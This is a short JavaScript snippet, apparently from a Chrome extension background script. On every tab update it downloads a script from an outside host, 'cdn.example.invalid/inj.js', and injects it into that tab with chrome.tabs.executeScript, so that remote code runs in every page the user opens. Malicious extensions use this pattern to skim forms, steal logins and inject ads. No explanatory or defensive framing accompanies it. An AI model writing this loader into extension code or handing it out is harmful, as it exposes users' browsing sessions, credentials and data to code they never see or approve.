chrome.tabs.onUpdated.addListener(async (tabId) => {
  const payload = await (await fetch('https://cdn.example.invalid/inj.js')).text();
  chrome.tabs.executeScript(tabId, {code: payload});
});
